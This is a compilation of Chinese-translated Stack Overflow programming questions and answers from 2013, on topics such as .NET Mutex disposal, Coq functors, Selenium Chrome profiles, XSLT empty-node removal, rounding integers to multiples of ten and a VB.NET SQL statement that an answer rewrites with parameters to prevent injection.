Mutex 和许多其他同步对象是围绕不同内核对象的包装器（[http://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx)），所以是的，它们使用底层的非托管资源。

您应该在使用完它们后调用`.Dispose`它们，但是，当您的进程退出或启动终结器时（如果您没有处理它们），它们将被释放，所以我想，为了简单起见，它们只是没有`Dispose`正确地处理它们。

MSDN 关于 WaitHandles 的注释：

```
在释放对 WaitHandle 的最后引用之前，请始终调用 Dispose。
否则，它正在使用的资源将不会
在垃圾收集器调用 WaitHandle 对象的 Finalize 方法之前被释放。

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:35:11.787

是的，您应该处置它，`Mutex`因为它继承`WaitHandle`了 implements `IDisposable`。

在内部，`Mutex`是由[CreateMutext](http://msdn.microsoft.com/en-us/library/ms682411%28v=vs.85%29.aspx)创建的内核对象的包装器。我想`Dispose`.Net`Mutex`类的实现调用`CloseHandle`关闭内核对象句柄。

无论如何，当进程退出时，系统会自动关闭这样的句柄。

# coq - 如何在 Coq 的模块中使用引理？

> ID：15154401
> 
> 赞同：0
> 
> 时间：2013-03-01T09:26:55.107
> 
> 标签：coq

我在一个名为的文件中定义了一个模块类型`A.v`

```
Module Type WeakPair.
...

End WeakPair.

Module WeakPairProps (Import WP : WeakPair).

 Lemma Weak_A ....

End WeakPairProps. 
```

然后我想定义另一个`B.v`可以使用的文件，`Lemma`例如`WeakPairProps`：`Weak_A`. 因为`WeakPairProps`不是模块类型所以我不知道如何编写一个可以在`WeakPairProps`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T15:40:58.233

首先，您需要定义一个*实现*模块类型的模块`WeakPair`：

```
Module WeakPairImpl <: WeakPair.
(* stuff goes here *)
End WeakPairImpl. 
```

现在您可以*实例化*仿函数`WeakPairProps`：

```
Module WeakPairPropsInst := WeakPairProps(WeakPairImpl). 
```

您现在可以参考引理：

```
WeakPairPropsInst.lemma 
```

如果您不想使用限定名称，可以*导入WeakPairPropsInst。*

# asp.net - 当我使用 OnRowUpdated 和 OnRowUpdating 时。这些有什么用

> ID：15154403
> 
> 赞同：1
> 
> 时间：2013-03-01T09:27:13.450
> 
> 标签：asp.net, gridview, grid

`OnRowUpdated`我想知道和之间的区别`OnRowUpdating`。我给了`OnRowUpdated`和。不触发。只有工作正常`OnRowUpdating``gridview`
`OnRowUpdated``OnRowUpdating`

请澄清这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:35:05.247

文档是一个很好的起点——

[http://msdn.microsoft.com/en-GB/library/system.web.ui.webcontrols.gridview.onrowupdating.aspx](http://msdn.microsoft.com/en-GB/library/system.web.ui.webcontrols.gridview.onrowupdating.aspx)

[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.onrowupdated.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.onrowupdated.aspx)

所以总结一下——

RowUpdating 事件在单击行的更新按钮时引发，但*在*GridView 控件更新行之前。

RowUpdated 事件在单击行的更新按钮时引发，但*在*GridView 控件更新行之后。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:33:58.900

> They are both used for two different things. It depends on whether you are accessing the row before or after the update.

# javascript - 尝试在脚本标签中动态添加 CDATA 时出现语法错误

> ID：15154407
> 
> 赞同：1
> 
> 时间：2013-03-01T09:27:24.520
> 
> 标签：javascript, jquery, ajax, cdata

因此，我尝试将一个广告代码动态添加到 DOM 中，如下所示：

```
<script type="text/javascript"><!--<![CDATA[
   JAVASCRIPT CODE
//]]>--></script> 
```

如果我将此代码直接粘贴到源代码中，它可以工作，但是如果我尝试使用 jQuery 将它插入到 DOM 中，它会引发一些无法追踪的错误——至少我无法追踪它。其实这个：

![javascript语法错误](../Images/9e4e6770fbab2ed37f3fb5c33fbf632a.png)

有趣的是，Firebug 将此错误连接到页面中包含 jQuery 的随机脚本。广告代码以这种方式插入 DOM /`element`是一个 jQuery 对象 /：

```
element.html(data.content); 
```

我已经尝试过的：

1.  我试图删除`<!-- -->`html 评论标签。
2.  我试图将 wole 代码包装到由 jQuery 动态创建的脚本标记中。
3.  我什至尝试删除 CDATA 标签，但这破坏了一切，我认为这对于广告管理公司提供的主要广告处理程序脚本很重要。

任何帮助将不胜感激，在此先感谢！

（请不要在意方法，必须用ajax完成。）

**编辑：**问题仍然存在，但我认为广告代码一定有问题，所以我接受了这个主题的第一个有用的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:29:32.937

试试这样：

```
<script type="text/javascript">
/* <![CDATA[ */
  ...
/* ]]> */
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:30:34.327

用这个

```
<script type="text/javascript">
 //<![CDATA[
 //YOUR CODE
//]]>
</script> 
```

让我知道问题是否仍然存在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:32:28.283

```
<script type="text/javascript">
//<![CDATA[
        ...
//]]>
</script>

<!-- (For styles, it is different) -->

<style type="text/css">
/*<![CDATA[*/
        ...
/*]]>*/
</style> 
```

如果您确实需要与无法识别导致其内容显示在页面上的脚本或样式标签的非常旧的浏览器兼容，您可以使用以下命令：

```
<script type="text/javascript"><!--//--><![CDATA[//><!--
        ...
//--><!]]></script>

<!-- (For styles, it is different) -->

<style type="text/css"><!--/*--><![CDATA[/*><!--*/
        ...
/*]]>*/--></style> 
```

`<![CDATA[`您可以嵌入`JS`（`XML`和 XHTML）文档中，而无需用XML 实体替换特殊`XML`字符，如`<`, `>`,等`&``<``>``&`

# google-chrome - 无法使用经过 http 基本身份验证的 Selenium WebDriver 中的默认/自定义配置文件启动 Google Chrome

> ID：15154411
> 
> 赞同：2
> 
> 时间：2013-03-01T09:27:49.067
> 
> 标签：google-chrome, selenium, webdriver, profile

以下方法无法正常工作。由于使用了 GRID，因此这里将**能力**设置为**空**。

```
System.setProperty("webdriver.chrome.driver", "C:/chromedriver.exe");   
DesiredCapabilities capability=null; 
```

**方法一：**

```
DesiredCapabilities capabilities = DesiredCapabilities.chrome();
capabilities.setCapability("chrome.switches", Arrays.asList("--user-data-dir=C:/Users   /username/AppData/Local/Google/Chrome/User Data/Default"));
driver = new ChromeDriver(capabilities); 
```

**方法二：**

```
DesiredCapabilities capabilities = DesiredCapabilities.chrome(); 
String chromeProfile = "C:/Users/username/AppData/Local/Google/Chrome/Application   /chrome.exe"; 
ArrayList<String> switches = new ArrayList<String>(); 
switches.add("C:/Users/username/AppData/Local/Google/Chrome/User Data/Default" + chromeProfile); 
capabilities.setCapability("chrome.switches", switches); 
driver = new ChromeDriver(capabilities); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T12:47:35.727

```
System.setProperty("webdriver.chrome.driver","C:\\chromedriver.exe");
ChromeOptions options = new ChromeOptions();
options.addArguments("user-data-dir=C:/Users/user_name/AppData/Local/Google/Chrome/User Data");
options.addArguments("--start-maximized");
driver = new ChromeDriver(options); 
```

如果你遇到这样的错误：

**org.openqa.selenium.WebDriverException：未知错误：Chrome 启动失败：正常退出**

然后尝试创建一个新的 Chrome 配置文件并执行测试。

1.  复制文件夹，`'User Data'`
2.  在同一位置粘贴并重命名文件夹。`e.g., New User`
3.  现在，找到目录，`C:/Users/user_name/AppData/Local/Google/Chrome/New User`
4.  如果您想测试配置文件，请为一些站点添加书签并在下次运行时观察它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:46:46.687

1 在启动节点时设置 chromedriver 属性。我的做法：

```
java -jar selenium-server-standalone-2.31.0.jar -role node -hub http://localhost:4444/grid/register -maxSession 15 -browser browserName="chrome",version=ANY,platform=WINDOWS,maxInstances=15 -Dwebdriver.chrome.driver=lib\chromedriver.exe 
```

2 在代码中我的方法：

```
capabilities = DesiredCapabilities.chrome();
capabilities.setCapability("chrome.switches", Arrays.asList("--start-maximized"));
driver = new RemoteWebDriver(new URL("http://127.0.0.1:4444/wd/hub"), capabilities); 
```

3 加载HTTP基本认证页面：

```
String username = "Pavel";
String password = "Omgtoosecrettotellyou";
driver.get("http://" + username + ":" + password + "@" +"your-site.com"); 
```

# knockout.js - knockoutjs 验证异步 ajax 总是变得无效

> ID：15154412
> 
> 赞同：0
> 
> 时间：2013-03-01T09:27:53.810
> 
> 标签：knockout.js, knockout-validation

我正在使用淘汰赛验证插件，但我没有得到如何验证验证是真还是假

```
ko.validation.rules['remote'] = {
        async: true,
        validator: function ( val, parms, callback ) { 
            var defaults = {
                url: '/ajax/auth',
                type: 'POST',
                success: callback
            };

            var options = $.extend( defaults, parms );

            $.ajax( options );
        },
        message: 'Default Invalid Message'
    };

var username = ko.observable().extend({ remote : { data: {email : username} }});

// setting it will trigger validation
username.isValidating.subscribe(function(isValid){
     if(isValid){
         // save the username or whatever you do
     }else{
         // invalid 
     }

// ajax.php

function isValidEmail(){
        $data = $this->input->get_post();
        return is_valid_email($data['email']);
}; 
```

我总是变得无效请解释这是如何工作的

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T12:49:27.743

`callback`您应该在 ajax-response 上调用 given`true`或`false`指示验证成功。

```
 validator: function ( val, parms, callback ) { 
        var defaults = {
            url: '/ajax/auth',
            type: 'POST',
            success: callback
        };

        var options = $.extend( defaults, parms );

        $.ajax(options, function(data){
            // data format depends on your implementation
            // just for example:
            if (data.result == 'ok') {
                callback(true);
            } else {
                callback(false);
            }
        });
    }, 
```

# c++ - 获取所选文件 Qt 的名称和位置

> ID：15154413
> 
> 赞同：0
> 
> 时间：2013-03-01T09:27:53.443
> 
> 标签：c++, qt

我有一个程序，其中我有一个按钮来获取文件对话框![在此处输入图像描述](../Images/af739c25ee5694066e7ec02dea060579.png)

如何选择文件，获取文件名和位置，并将其保存到 ui 中显示的字符串。`clicked()`从按钮发出的信号连接到 slot `fileSELECT()`。

```
........
 void MainThread::fileSELECT(){
QString fileName = QFileDialog::getOpenFileName(this,tr("Select video"),"d:\\BMDvideos",tr("Video files (*.avi)"));

   } 
```

所以当我选择一个 .avi 文件时，如何在 fileName 中显示它的位置

```
 d:\BMDvideo\videFile.avi 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:22:44.680

所以我想我现在明白了。我的第一个代码完全错误。

```
 void MainThread::fileSelect(){
QString fileName = QFileDialog::getOpenFileName(this,tr("Select video"),"d:\\BMDvideos",tr("Video files (*.avi)"));
QLabel *testLabel =   new QLabel(fileName);
BOX->addWidget(testLabel);

    } 
```

我现在可以看到所选文件的路径

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:55:01.807

要获取文件夹路径，您可以使用`QFileDialog::getExistingDirectory`, 并获取文件名使用`QFileDialog::getOpenFileName`

# java - 使用 JCreator 向 JTable 添加行

> ID：15154415
> 
> 赞同：0
> 
> 时间：2013-03-01T09:27:56.343
> 
> 标签：java, swing, jtable, variable-assignment

我想在 JTable 中添加行，但效果不佳。有人可以帮助我吗？表格显示正常但不是动态显示

```
//displays all data in Jtable
void refresh()
{
    Vector<Vector<String>> data = new Vector<>();

        ResultSet rs = st.executeQuery("SELECT * FROM tblInfo");

        while(rs.next())
        {           
        Vector<String> d = new Vector<>();
        d.add(rs.getString("ID"));  
        d.add(rs.getString("Name"));
        d.add(rs.getString("User"));
        d.add(rs.getString("Pass"));
        data.add(d);
        }

        Vector<String> header = new Vector<>();
        header.add("ID");
        header.add("Name");
        header.add("Username");
        header.add("Password");

        model = new DefaultTableModel(data, header);
        table = new JTable(model);
        st.close();
        rs.close();

        table.setBackground(Color.LIGHT_GRAY);
        table.setForeground(Color.white);
        scroll = new JScrollPane(table);
        getContentPane().add(scroll);

    st.close();
    rs.close();
}

//adding data to database
void addDoctor()
    {

        st.executeUpdate("INSERT INTO tblInfo(Name) VALUES ('Name')");  

    st.close();
}

public void actionPerformed(ActionEvent e){ 
    Object source = e.getSource();

    else if(btnAdd == source)
    {

        addDoctor();
        refresh();      
    } 
```

感谢您的任何回复。:) 我在发布之前已经编辑了这段代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:42:02.597

1）不要在里面创建任何对象`try - catch - finally block`；对于 Swing GUI，事先准备好这些对象，最好作为局部变量。

2) 你创建了一个新的

```
model = new DefaultTableModel(data, header);
table = new JTable(model); 
```

并且那些对象可能永远不会添加到已经可见的 GUI 中。Swing GUI 并不关心，并且容器不知道您更改（重置、重新初始化）底层模型和 JTable。您必须通知 Swing GUI 进行更改，但这不是正确的方式。

3）不要在运行时重新创建这个对象，重用已经存在的对象，只创建一次JTable和DefaultTableModel。

`DefaultTableModel`4）通过使用重置`model.setRowCount(0);`然后从JDBC添加新行

5）不要重新发明轮子，搜索`ResultSetTableModel`or `TableFromDatabase`。

6) 将代码行`st.close();`& 移动`rs.close();`到`finally block`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:20:27.080

使用[DefaultTableModel.setDataVector()](http://docs.oracle.com/javase/7/docs/api/javax/swing/table/DefaultTableModel.html#setDataVector%28java.util.Vector,%20java.util.Vector%29 "DefaultTableModel.setDataVector()")将带有新数据的新向量添加到现有 TableModel/JTable。或者使用 insertRow/removeRow 方法。或者实现你自己的 AbstractTableModel。

# google-chrome - 如何查看/检查 Chrome 扩展程序的本地存储？

> ID：15154416
> 
> 赞同：5
> 
> 时间：2013-03-01T09:27:59.700
> 
> 标签：google-chrome, google-chrome-extension

我打开了我的 background.html 并检查了“资源-> 本地存储”。它总是空的。但根据我在代码中的调试信息，本地存储似乎工作正常。

所以它有效，但我想看到它们。

我还在普通页面中检查了“资源 - >本地存储”，它很好地显示了数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:35:08.690

也许这个 Chrome 内部页面 (chrome://appcache-internals/) 会对您有所帮助。它显示了 HTML5 的缓存。是你要找的吗？

# ruby - Ruby gems 争夺两个不同版本的 activesupport？

> ID：15154431
> 
> 赞同：0
> 
> 时间：2013-03-01T09:28:39.393
> 
> 标签：ruby, rvm

我正在尝试使用以下命令从命令行运行 resque 服务器：

```
rake resque:work 
```

红宝石抱怨如下：

```
Bundler could not find compatible versions for gem "activesupport":
  In Gemfile:
    daemon-kit (>= 0) ruby depends on
      activesupport (< 3.2.0, >= 2.3.5) ruby

    actionpack (>= 0) ruby depends on
      activesupport (3.2.12) 
```

如何解决这些依赖关系？我可以在同一个 RVM gemset 中安装两个版本的 activesupport 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:39:34.173

您需要将您的 activesupport 版本降级为支持 daemonkit 的版本 - 或查找 daemonkit 的更新版本。您当前的 rails / activesupport 版本比您的 daemon-kit 版本支持的版本新。

您可以在一个 gemset 中拥有多个版本的 activesupport，但一次只能激活其中一个。

# marionette - marionette.js 布局/区域结构和渲染方法示例

> ID：15154442
> 
> 赞同：3
> 
> 时间：2013-03-01T09:29:24.743
> 
> 标签：marionette

我正在为我的主干应用程序尝试 marionette.js，但我对如何组织布局/区域并呈现它们感到有些困惑。

我正在寻找具有嵌套布局和区域的示例应用程序，以便我能更好地理解。有什么建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-01T11:16:07.440

看看这个小提琴：

[http://jsfiddle.net/tegon/0g2aaLxe/1/](http://jsfiddle.net/tegon/0g2aaLxe/1/) [http://jsfiddle.net/tegon/64ovLf64/](http://jsfiddle.net/tegon/64ovLf64/)

对于一般骨干木偶样板起始点，请检查：

[https://stackoverflow.com/questions/11410059/suggested-bootstrap-boilerplate-sample-for-backbone-marionette-application/11598371#11598371](https://stackoverflow.com/questions/11410059/suggested-bootstrap-boilerplate-sample-for-backbone-marionette-application/11598371#11598371)

# java - 告诉异步作业在 Java 中等待

> ID：15154450
> 
> 赞同：1
> 
> 时间：2013-03-01T09:29:38.833
> 
> 标签：java, multithreading, asynchronous, runnable

我有一种情况，有时（并非总是）我的异步作业无法在需要的时间内处理结果，我必须向客户返回某种消息，说他的请求仍在通过在数据库中检查来准备.

请求和为其创建必要的对象在一个数据库事务中处理，异步过程在不同的事务中处理。我`ScheduledThreadPoolExecutor`通过将可运行实例传递给执行方法来使用。

有时客户端发出请求并且他的浏览器正在加载我的异步作业时的问题能够为其准备必要的数据，但有时它不是。

所以我的问题是：无论如何我可以告诉异步作业等到数据准备好了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:35:49.100

恐怕只使用一个 Runnable 实例，您无法告诉进程等待，除非您将线程休眠一段时间或循环并继续询问结果，这两个都是坏主意。

为了使这正确发生，您应该通过将[Callable](http://download.java.net/jdk7/archive/b123/docs/api/java/util/concurrent/Callable.html)实例传递给它的构造函数来为此使用[FutureTask 。](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/FutureTask.html)通过覆盖您的 call() 方法，您应该告诉您事务处理程序来完成这项工作。

您还需要有某种任务管理器，它将任务添加到队列中并创建一个线程池来接收和处理这些任务。出于队列目的，我建议使用例如：[LinkedBlockingDeque](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/LinkedBlockingDeque.html)，它接受 FutureTask 的通用类型。

此外，您应该有一张未来任务的地图，由他们的名字或以 FutureTask 作为值的东西映射。[在处理给定的FutureTask](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/FutureTask.html)时等待结果，您必须立即将其从期货地图中删除。然后，当您的客户请求时，您应该检查：如果期货地图包含任务，则从中获取 FutureTask 并在其上调用 futureTask.get()。这将等到任务完成。

这只是我会采用的方法。希望这可以帮助。

# xml - 使用 XSLT 进行 XML 转换 - 截断空节点

> ID：15154454
> 
> 赞同：0
> 
> 时间：2013-03-01T09:29:58.147
> 
> 标签：xml, xslt

我有以下 XML：

```
<EMPLOYEE_LIST>
   <EMPLOYEES>
      <EMPLOYEE>
         <EMPID>650000</EMPID>
         <FIRST_NAME>KEITH</FIRST_NAME>
         <MIDDLE_NAME>HUTCHINSON</MIDDLE_NAME>
         <LAST_NAME>ROGERS</LAST_NAME>
         .
         .
         .
         .
         <EMP_ADDR>
            <STREET>A</STREET>
            <CITY>B</CITY>
            <STATE> </STATE>
            <ZIP>90210</ZIP>
            <COUNTRY>C</COUNTRY>
         </EMP_ADDR> 
         <EMP_ADDR>
            <STREET>G</STREET>
            <CITY>H</CITY>
            <STATE>I</STATE>
            <ZIP> </ZIP>
            <COUNTRY> </COUNTRY>
         </EMP_ADDR>
       </EMPLOYEE>
    </EMPLOYEES>
</EMPLOYEE_LIST> 
```

它给了我下面提到的输出：

```
<?xml version="1.0" encoding="UTF-8"?>
<employees>
      <employee>
         <emp_id>111345</emp_id>
         <f_name>KEITH</f_name>
         <m_name>HUTCHINSON</m_name>
         <l_name>ROGERS</l_name>
         .
         .
         .
         .
         <addresses>
            <addr>A</addr>
            <city>B</city>
            <province/>
            <postal>90210</postal>
            <country>C</country>
         </addresses>
         <addresses>
            <addr>G</addr>
            <city>H</city>
            <province>I</province>
            <postal/>
            <country/>
         </addresses>
      </employee>
</employees> 
```

使用此 XSLT 进行转换时：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
    <xsl:output method="xml" encoding="UTF-8" indent="yes"/>
    <xsl:strip-space elements="*"/>
        <xsl:template match="/EMPLOYEE_LIST">
            <employees>
                <xsl:apply-templates select="EMPLOYEES/node()"/>
            </employees>        
        </xsl:template>

        <xsl:template match="EMPLOYEE">
        <employee>
            <xsl:apply-templates select="*"/>
        </employee>
        </xsl:template>

        <xsl:template match="EMPLOYEE/EMPID">
        <emp_id>
            <xsl:value-of select="."/>
        </emp_id>
        </xsl:template>

        <xsl:template match="EMPLOYEE/FIRST_NAME">
        <f_name>
            <xsl:value-of select="."/>
        </f_name>
        </xsl:template>

        <xsl:template match="EMPLOYEE/MIDDLE_NAME">
            <m_name>
                <xsl:value-of select="."/>
            </m_name>
        </xsl:template>

        <xsl:template match="EMPLOYEE/LAST_NAME">
            <l_name>
                <xsl:value-of select="."/>
            </l_name>
        </xsl:template>
        .
        .
        .
        .
        .
       <xsl:template match="EMPLOYEE/EMP_ADDR[position() &lt; 5]">
        <addresses>
            <addr>
                <xsl:value-of select="normalize-space(STREET)"/>
            </addr>
            <city>
                <xsl:value-of select="normalize-space(CITY)"/>
            </city>
        <province>
                <xsl:value-of select="normalize-space(STATE)"/>
            </province>
            <postal>
                <xsl:value-of select="normalize-space(ZIP)"/>
            </postal>
            <country>
                <xsl:value-of select="normalize-space(COUNTRY)"/>
            </country>
        </addresses>
      </xsl:template>
</xsl:stylesheet> 
```

这不是我想要实现的目标，因为我需要截断/删除空节点的输出，如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<employees>
      <employee>
         <emp_id>111345</emp_id>
         <f_name>KEITH</f_name>
         <m_name>HUTCHINSON</m_name>
         <l_name>ROGERS</l_name>
         .
         .
         .
         .
         <addresses>
            <addr>A</addr>
            <city>B</city>
            <postal>90210</postal>
            <country>C</country>
         </addresses>
         <addresses>
            <addr>G</addr>
            <city>H</city>
            <province>I</province>
         </addresses>
      </employee>
</employees> 
```

有什么办法吗？有人可以帮我吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:06:40.750

可能最简单的方法是将样式表的末尾更改为以下内容：

```
<xsl:template match="EMPLOYEE/EMP_ADDR[position() &lt; 5]">
    <addresses>
        <xsl:apply-templates select="STREET"/>
        <xsl:apply-templates select="CITY"/>
        <xsl:apply-templates select="STATE"/>
        <xsl:apply-templates select="ZIP"/>
        <xsl:apply-templates select="COUNTRY"/>
    </addresses>
</xsl:template>

<xsl:template match="STREET">
    <addr>
        <xsl:value-of select="normalize-space(.)"/>
    </addr>
</xsl:template>

<xsl:template match="CITY">
    <city>
        <xsl:value-of select="normalize-space(.)"/>
    </city>
</xsl:template>

<xsl:template match="STATE">
    <province>
        <xsl:value-of select="normalize-space(.)"/>
    </province>
</xsl:template>

<xsl:template match="ZIP">
    <postal>
        <xsl:value-of select="normalize-space(.)"/>
    </postal>
</xsl:template>

<xsl:template match="COUNTRY">
    <country>
        <xsl:value-of select="normalize-space(.)"/>
    </country>
</xsl:template>

<!--
Drop elements that don't have any text content after whitespace normalization
-->
<xsl:template match="*[not(normalize-space(.))]"/> 
```

这假设您要在文档中的*任何位置放置空元素。*如果你只想删除元素的空子`<EMP_ADDR>`元素，你可以使用`<xsl:template match="EMP_ADDR/*[not(normalize-space(.))]"/>`.

# c# - 将整数四舍五入到最接近 10 的倍数

> ID：15154457
> 
> 赞同：37
> 
> 时间：2013-03-01T09:30:02.950
> 
> 标签：c#, currency, rounding

我试图弄清楚如何四舍五入价格 - 两种方式。例如：

```
Round down
43 becomes 40
143 becomes 140
1433 becomes 1430

Round up
43 becomes 50
143 becomes 150
1433 becomes 1440 
```

我有一个价格范围的情况：

```
£143 - £193 
```

其中我想显示为：

```
£140 - £200 
```

因为它看起来更干净

关于如何实现这一目标的任何想法？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2013-03-01T09:35:06.313

我只想创建几个方法；

```
int RoundUp(int toRound)
{
     if (toRound % 10 == 0) return toRound;
     return (10 - toRound % 10) + toRound;
}

int RoundDown(int toRound)
{
    return toRound - toRound % 10;
} 
```

模数给了我们余数，在四舍五入的情况下`10 - r`将您带到最接近的十分之一，向下四舍五入您只需减去 r。很直接。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-03-01T10:15:32.607

您不需要使用模数 (%) 或浮点数...

这有效：

```
public static int RoundUp(int value)
{
    return 10*((value + 9)/10);
}

public static int RoundDown(int value)
{
    return 10*(value/10);
} 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2013-03-01T09:44:17.747

此代码四舍五入到最接近的 10 倍数：

```
int RoundNum(int num)
{
     int rem = num % 10;
     return rem >= 5 ? (num - rem + 10) : (num - rem);
} 
```

非常简单的用法：

```
Console.WriteLine(RoundNum(143)); // prints 140
Console.WriteLine(RoundNum(193)); // prints 190 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-03-01T09:39:57.060

将数字除以 10。

```
number = number / 10;
Math.Ceiling(number);//round up
Math.Round(number);//round down 
```

然后乘以 10。

```
number = number * 10; 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2014-10-15T09:54:23.777

将一个数字四舍五入为另一个数字的倍数的一般方法，[从零](https://en.wikipedia.org/wiki/Rounding#Round_half_away_from_zero)四舍五入。

**对于整数**

```
int RoundNum(int num, int step)
{
    if (num >= 0)
        return ((num + (step / 2)) / step) * step;
    else
        return ((num - (step / 2)) / step) * step;
} 
```

**对于浮动**

```
float RoundNum(float num, float step)
{
    if (num >= 0)
        return floor((num + step / 2) / step) * step;
    else
        return ceil((num - step / 2) / step) * step;
} 
```

我知道有些部分可能看起来违反直觉或不是很优化。我尝试将 (num + step / 2) 转换为 int，但这对于负浮点数（`(int) -12.0000 = -11`等等）给出了错误的结果。无论如何，这些是我测试过的几个案例：

*   四舍五入到第 1 步的任何数字都应该是它自己
*   -3 四舍五入到第 2 步 = -4
*   -2 四舍五入到第 2 步 = -2
*   3 舍入到第 2 步 = 4
*   2 舍入到第 2 步 = 2
*   -2.3 四舍五入到步长 0.2 = -2.4
*   -2.4 四舍五入到步长 0.2 = -2.4
*   2.3 四舍五入到步骤 0.2 = 2.4
*   2.4 四舍五入到步长 0.2 = 2.4

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-01-16T12:51:41.107

```
public static int Round(int n)
        {
            // Smaller multiple 
            int a = (n / 10) * 10;

            // Larger multiple 
            int b = a + 10;

            // Return of closest of two 
            return (n - a > b - n) ? b : a;
        } 
```

# vb.net - VB.NET 2010 添加声明

> ID：15154459
> 
> 赞同：0
> 
> 时间：2013-03-01T09:30:07.367
> 
> 标签：vb.net, visual-studio-2010, visual-studio, vb.net-2010

我的 ADD 按钮上有这个代码，还有其他方法可以缩短这个代码语句。

```
Private Sub btnAdd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAdd.Click

    On Error GoTo ErrSQL

    Dim cmd As New OleDb.OleDbCommand
    If Not cnn.State = ConnectionState.Open Then
        'Open connection if it is not yet open
        cnn.Open()
    End If
    cmd.Connection = cnn
    'check whether add new update
    If Me.txtstdID.Tag & "" = "" Then
        'add new
        'add data to table
        cmd.CommandText = "INSERT INTO inventory (ID,BRAND,SPECIFICATION,STATUS) Values ('" & Me.txtstdID.Text & "','" & Me.cboBrand.Text & "','" & Me.txtDescription.Text & "','" & strStat & "')"
        cmd.ExecuteNonQuery()

    Else
        'update data in table
        cmd.CommandText = "UPDATE inventory  SET ID =" & Me.txtstdID.Text & ",BRAND='" & Me.cboBrand.Text & "', SPECIFICATION='" & Me.txtDescription.Text & "', STATUS = '" & strStat & "', WHERE ID=" & Me.txtstdID.Text & ""
        cmd.ExecuteNonQuery()
    End If
    'refresh data in list
    RefreshData()
    'clear form
    Me.btnClear.PerformClick()

    'close connection
    cnn.Close()

    Exit Sub
 ErrSQL:
    MsgBox(Err.Description)

End Sub 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:47:59.967

缩短代码没有太多工作要做，防止 Sql Injection 和解析问题有很多工作要做。我会尝试将您的代码更改为此

```
Try
    Using cnn = new OleDbConnection(constring)
        Dim cmd As New OleDb.OleDbCommand
        cnn.Open()
        cmd.Connection = cnn
        Dim cmdText as String

        'check whether add new update
        If Me.txtstdID.Tag & "" = "" Then
              cmdText = "INSERT INTO inventory (ID,BRAND,SPECIFICATION,STATUS) " + 
                         "Values (@ID, @Brand, @specs, @stat)"
        else
              cmdText = "UPDATE inventory SET ID=@ID, BRAND=@Brand,SPECIFICATION=@specs" +
                        "STATUS = @stat WHERE ID=@ID"    
        End If
        cmd.CommandText = cmdText
        cmd.Parametes.AddWithValue("@ID", Me.txtstdID.Text)
        cmd.Parametes.AddWithValue("@Brand", Me.cboBrand.Text)
        cmd.Parametes.AddWithValue("@specs", Me.txtDescription.Text)
        cmd.Parametes.AddWithValue("@stat", strStat)
        cmd.ExecuteNonQuery()
   End Using
   'refresh data in list
   RefreshData()
   'clear form
   Me.btnClear.PerformClick()
Catch(x As Exception)
    MsgBox(x.Message)
End Try 
```

我很想删除`SET ID=@ID`Update 语句中的冗余，但是，您必须在其他参数之后添加 @ID 参数，因为在 OleDb 中，参数顺序很重要

# jquery - 弹出页面中的链接不起作用

> ID：15154461
> 
> 赞同：0
> 
> 时间：2013-03-01T09:30:11.773
> 
> 标签：jquery, google-chrome, google-chrome-extension

我正在为书签页面制作一个 chrome 扩展，并将它们存储为带有 localStorage 的 JSON。这是一个屏幕截图 -
![扩展截图](../Images/647efdd270e59d731ba3aa439e6c01b5.png)
问题是当我点击链接时，什么也没有发生。
所以我尝试为所有链接分配一个 .link 类，并附加了这个监听器 -

```
$('.link').click(function(){
  var url = $(this).attr('href');
  var urlList = {};
  urlList['url'] = url;
  chrome.tabs.create(urlList);
}); 
```

但仍然什么也没发生。我确实右键单击浏览器操作按钮并尝试检查弹出窗口，它表明没有附加到链接的侦听器。

这是github[上整个项目的来源。](https://github.com/saivineet89/DocSaver)

请帮我让这个链接打开一个带有指定网址的新标签。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:05:01.270

您应该将正确的 url 地址放在链接的 href 属性中。因此，在您`$('#viewAll').click(function(){ ... }`的回调中，替换该行

```
str += '<tr>' + '<td><a class="link" href="' + objects[keys[i]] + '">' + keys[i] + 
```

经过

```
str += '<tr>' + '<td><a class="link" href="http://' + keys[i] + '">' + keys[i] + 
```

它会起作用的！

* * *

## 回答 #2

